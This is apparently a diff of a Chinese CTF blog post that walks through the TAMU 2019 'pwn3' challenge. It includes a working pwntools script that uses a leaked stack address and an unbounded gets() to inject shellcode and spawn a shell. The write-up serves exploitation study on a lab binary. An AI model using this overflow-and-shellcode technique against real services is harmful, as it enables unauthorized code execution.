@@ -22,12 +22,12 @@
 <meta property="og:site_name" content="ticker-tape timer&#39;s blog">
 <meta property="og:description" content="pwn3二进制作业，来自Tamu19(不知道是啥来的)的一道题打开IDAecho函数会打印s的地址，并且gets函数没有限制s输入长度，于是构造shellcode在栈上，将返回地址覆盖为s的地址，使其跳转执行shellcode构造payload 1234567891011from pwn import *p&#x3D;process(&#39;.&#x2F;pwn3&#39;)a &#x3D; p.recvline()b &#x3D; a.strip(">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://whyiamddjsq.icu/.icu//pwn3/1.png">
+<meta property="og:image" content="http://whyiamddjsq.icu/2020/04/16/pwn3/pwn3/1.png">
 <meta property="article:published_time" content="2020-04-16T14:23:53.000Z">
 <meta property="article:modified_time" content="2020-07-17T03:26:15.754Z">
 <meta property="article:author" content="ticker-tape timer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://whyiamddjsq.icu/.icu//pwn3/1.png">
+<meta name="twitter:image" content="http://whyiamddjsq.icu/2020/04/16/pwn3/pwn3/1.png">
 
   
 
@@ -182,7 +182,7 @@ ga('send', 'pageview');
 
   <div class="article-content">
     
-      <h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>二进制作业，来自Tamu19(不知道是啥来的)的一道题<br>打开IDA<br><img src="/.icu//pwn3/1.png" alt="1"><br>echo函数会打印s的地址，并且gets函数没有限制s输入长度，于是构造shellcode在栈上，将返回地址覆盖为s的地址，使其跳转执行shellcode<br>构造payload</p>
+      <h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>二进制作业，来自Tamu19(不知道是啥来的)的一道题<br>打开IDA<br><img src="/2020/04/16/pwn3/pwn3/1.png" alt="1"><br>echo函数会打印s的地址，并且gets函数没有限制s输入长度，于是构造shellcode在栈上，将返回地址覆盖为s的地址，使其跳转执行shellcode<br>构造payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn3'</span>)</span><br><span class="line">a = p.recvline()</span><br><span class="line">b = a.strip(<span class="string">'Take this, you might need it on your journey '</span>)</span><br><span class="line">c = b.strip(<span class="string">'!\n'</span>)</span><br><span class="line">add = int(c,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode + <span class="string">'a'</span>*(<span class="number">0x12E</span>-len(shellcode)) + p32(add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>ojbk</p>
 
